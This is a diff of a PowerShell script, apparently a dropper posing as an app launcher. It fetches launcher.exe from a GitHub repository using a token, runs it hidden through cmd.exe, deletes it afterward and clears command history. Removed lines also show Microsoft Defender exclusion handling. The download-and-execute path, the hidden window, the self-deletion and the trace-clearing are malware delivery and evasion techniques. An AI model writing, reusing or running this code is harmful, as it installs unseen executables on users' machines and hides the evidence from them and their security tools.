@@ -53,6 +53,10 @@ function ClrHistory {
     }
 }
 
+function StartApp {
+
+}	
+
 Start-Sleep -s 1
 
 try {
@@ -74,18 +78,20 @@ try {
 		$q = '"'
         $h = @{"Authorization" = "$String"}
         $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher.exe' -Method 'GET' -Headers $h
-        if ($response.content) {
-            try {
-                $cleanedContent = $response.content -replace "`n", "" -replace "`r", ""
-                $decodedContent = [System.Convert]::FromBase64String($cleanedContent)
-				[System.IO.File]::WriteAllBytes($contFile, $decodedContent)
-            } catch {
-				Write-Host "Error Download, not content." -ForegroundColor Red
+		Invoke-WebRequest $response.download_url -OutFile $contFile
+        if (Test-Path $contFile) {
+			try {
+				$q = '"'
+				$arg = "$q$contFile$q"
+				
+				Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c $arg && del $arg" -WindowStyle Hidden
+
+			} catch {
+				Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
 				Start-Sleep -s 3
-                exit
-            }
+			}
         } else {
-            Write-Host "Error, not file exists" -ForegroundColor Red
+            Write-Host "Error, not file exist" -ForegroundColor Red
             Start-Sleep -s 3
         }
     } catch {
@@ -93,19 +99,7 @@ try {
         Start-Sleep -s 3
     }
 
-    try {
-        $q = '"'
-        $arg = "$q$contFile$q"
-		
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c $arg && del $arg" -WindowStyle Hidden
 
-    } catch {
-        Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
-		Start-Sleep -s 3
-    }
-	try{
-		# Remove-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
-	} catch{ Write-Host "Remove-MpPreference: $($_.Exception.Message)" -ForegroundColor Red }
 } finally {
 	
     ClrHistory
